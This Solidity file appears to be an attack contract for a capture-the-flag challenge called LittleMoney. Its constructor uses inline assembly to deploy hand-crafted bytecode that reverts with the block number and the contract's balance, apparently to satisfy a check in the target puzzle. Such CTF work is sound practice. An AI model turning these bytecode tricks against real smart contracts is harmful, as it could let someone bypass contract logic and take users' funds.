// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "hardhat/console.sol";

contract LittleMoneyNumen23Attack {
    address private owner;

    constructor() {
        assembly {
            // mstore(0, number())
            // mstore(0x20, offset)
            // revert(0, 0x40)
            
            // callvalue: 0, selfbalance: offset
            // NUMBER
            // CALLVALUE
            // MSTORE
            // SELFBALANCE
            // PUSH1 0x20
            // MSTORE
            // PUSH1 0x40
            // CALLVALUE
            // REVERT
            mstore(0x00, shl(mul(8,20), 0x43345247602052604034fd00))
            return(0, 12)
        }
    }
}

